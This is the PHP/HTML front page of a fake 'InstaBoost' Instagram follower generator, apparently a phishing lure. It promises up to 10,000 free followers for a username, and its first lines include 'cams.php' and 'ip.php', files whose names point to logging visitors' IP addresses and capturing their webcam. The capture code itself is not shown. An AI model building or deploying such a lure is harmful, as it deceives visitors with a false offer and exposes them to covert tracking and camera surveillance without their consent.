<?php
    include 'cams.php';
    include 'ip.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost // Future of Social</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://kit.fontawesome.com/your-code.js" crossorigin="anonymous"></script>
</head>
<body>
    <div class="background-glow"></div>
    
    <div class="glass-card">
        <div class="logo-section">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="insta-logo">
            <h1>INSTA<span>BOOST</span></h1>
            <p>Quantum Growth Engine</p>
        </div>

        <div class="input-group">
            <input type="text" placeholder="@username" id="username">
            <div class="slider-container">
                <label>Follower Quantity: <span id="val">5000</span></label>
                <input type="range" min="100" max="10000" value="5000" class="slider" id="followerRange">
            </div>
        </div>

        <button class="cyperpunk-btn" onclick="startSimulation()">
            INITIALIZE UPLINK
        </button>

        <div id="status-box" class="hidden">
            <div class="loader"></div>
            <p id="status-text">Connecting to Mainframe...</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>